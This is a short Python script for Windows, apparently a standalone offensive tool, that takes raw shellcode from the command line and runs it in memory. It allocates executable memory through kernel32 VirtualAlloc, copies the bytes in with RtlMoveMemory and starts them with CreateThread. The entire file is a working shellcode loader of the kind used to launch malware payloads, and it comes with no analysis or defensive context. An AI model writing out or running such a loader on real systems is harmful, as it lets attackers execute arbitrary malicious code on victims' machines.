#!/usr/bin/env python
import ctypes, sys


class InjectShellcode():

	def runShellcode(self, shellcode):
		#ShellCode into bytearray
		code = bytearray(shellcode)
		#Uses kernel32 to inject into memory
		ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(code)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		buf = (ctypes.c_char * len(code)).from_buffer(code)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(code)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))


if __name__ == '__main__':
	try:
		shellcode = sys.argv[1]
		#Can hardcode options as well # shellcode = ""
		process = InjectShellcode()
		process.runShellcode(shellcode)
	except IndexError:
		print('Usage: inject_shellcode.py "\\xbe\\xba\\xfe\\xca\\xef\\xbe\\xad\\xde"')
		sys.exit(1)
